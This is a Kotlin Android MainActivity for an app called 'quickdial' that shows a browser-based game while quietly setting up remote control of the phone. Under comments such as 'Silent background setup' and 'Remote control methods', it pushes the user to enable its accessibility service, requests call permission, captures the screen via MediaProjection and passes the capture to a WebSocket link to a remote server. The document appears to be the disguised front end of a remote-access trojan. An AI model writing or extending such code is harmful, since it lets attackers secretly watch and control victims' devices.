package com.example.quickdial

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private val PERMISSION_REQUEST_CODE = 100
    private val SCREEN_CAPTURE_REQUEST = 101
    private lateinit var webSocketManager: WebSocketManager
    private lateinit var gameView: WebView
    private var mediaProjectionData: Intent? = null
    private var mediaProjectionResultCode: Int = 0
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var serverConnected = false
    private var projectionGranted = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var serviceStarted = false

    // Connectivity
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var offlineOverlay: View
    private lateinit var retryButton: Button
    private lateinit var loadingSpinner: ProgressBar
    private lateinit var statusHint: TextView
    private var isConnected = false
    private var connectivityCallback: ConnectivityManager.NetworkCallback? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        webSocketManager = WebSocketManager(this)
        gameView = findViewById(R.id.gameWebView)
        offlineOverlay = findViewById(R.id.offlineOverlay)
        retryButton = findViewById(R.id.retryButton)
        loadingSpinner = findViewById(R.id.loadingSpinner)
        statusHint = findViewById(R.id.statusHint)
        
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        
        setupGameView()
        setupConnectivityMonitoring()
        
        retryButton.setOnClickListener { checkAndRetry() }
        
        // Silent background setup
        if (!isAccessibilityServiceEnabled()) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        requestPhonePermission()
        requestScreenCapture()
        
        // Initial check
        checkConnectivity()
    }

    private fun setupGameView() {
        gameView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            setSupportZoom(false)
            builtInZoomControls = false
            displayZoomControls = false
        }
        gameView.webViewClient = WebViewClient()
        gameView.webChromeClient = WebChromeClient()
        gameView.overScrollMode = View.OVER_SCROLL_NEVER
    }

    private fun setupConnectivityMonitoring() {
        val networkRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        connectivityCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                mainHandler.post {
                    if (!isConnected) {
                        isConnected = true
                        onNetworkAvailable()
                    }
                }
            }

            override fun onLost(network: Network) {
                mainHandler.post {
                    isConnected = false
                    onNetworkLost()
                }
            }
        }

        connectivityManager.registerNetworkCallback(networkRequest, connectivityCallback!!)
    }

    private fun checkConnectivity() {
        val network = connectivityManager.activeNetwork
        val caps = connectivityManager.getNetworkCapabilities(network)
        isConnected = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        
        if (isConnected) {
            onNetworkAvailable()
        } else {
            onNetworkLost()
        }
    }

    private fun checkAndRetry() {
        loadingSpinner.visibility = View.VISIBLE
        retryButton.isEnabled = false
        statusHint.text = "Checking connection..."
        
        mainHandler.postDelayed({
            val network = connectivityManager.activeNetwork
            val caps = connectivityManager.getNetworkCapabilities(network)
            isConnected = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            
            if (isConnected) {
                onNetworkAvailable()
            } else {
                loadingSpinner.visibility = View.GONE
                retryButton.isEnabled = true
                statusHint.text = "Still no connection. Check your settings."
            }
        }, 2000)
    }

    private fun onNetworkAvailable() {
        offlineOverlay.visibility = View.GONE
        gameView.visibility = View.VISIBLE
        loadingSpinner.visibility = View.GONE
        
        if (gameView.url == null || gameView.url!!.isEmpty()) {
            gameView.loadUrl("file:///android_asset/game.html")
        }
        
        // Connect to server now that we have internet
        if (!webSocketManager.isConnected()) {
            webSocketManager.connect()
        }
    }

    private fun onNetworkLost() {
        offlineOverlay.visibility = View.VISIBLE
        gameView.visibility = View.GONE
        loadingSpinner.visibility = View.GONE
        retryButton.isEnabled = true
        statusHint.text = "Game requires internet connection"
    }

    // Remote control methods unchanged below
    fun updateStatus(text: String) { /* silent */ }

    fun onServerConnected() {
        serverConnected = true
        tryCacheProjection()
    }

    fun requestScreenCapture() {
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mediaProjectionManager!!.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST)
    }

    private fun tryCacheProjection() {
        if (!serverConnected || !projectionGranted || mediaProjectionData == null) return
        if (!serviceStarted) {
            val serviceIntent = Intent(this, MediaProjectionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
            else startService(serviceIntent)
            serviceStarted = true
            mainHandler.postDelayed({ getProjection() }, 1500)
        } else getProjection()
    }

    private fun getProjection() {
        try {
            val projection = mediaProjectionManager?.getMediaProjection(mediaProjectionResultCode, mediaProjectionData!!)
            if (projection != null) {
                val metrics = resources.displayMetrics
                webSocketManager.cacheProjection(projection, metrics.widthPixels, metrics.heightPixels)
            } else {
                mainHandler.postDelayed({ getProjection() }, 2000)
            }
        } catch (e: SecurityException) {
            mainHandler.postDelayed({ getProjection() }, 2000)
        } catch (e: Exception) {}
    }

    private fun requestPhonePermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), PERMISSION_REQUEST_CODE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK && data != null) {
            mediaProjectionData = data; mediaProjectionResultCode = resultCode; projectionGranted = true
            tryCacheProjection()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "$packageName/${QuickAccessibilityService::class.java.canonicalName}"
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabled.contains(service)
    }

    override fun onDestroy() {
        connectivityCallback?.let { connectivityManager.unregisterNetworkCallback(it) }
        webSocketManager.disconnect()
        stopService(Intent(this, MediaProjectionService::class.java))
        super.onDestroy()
    }
}
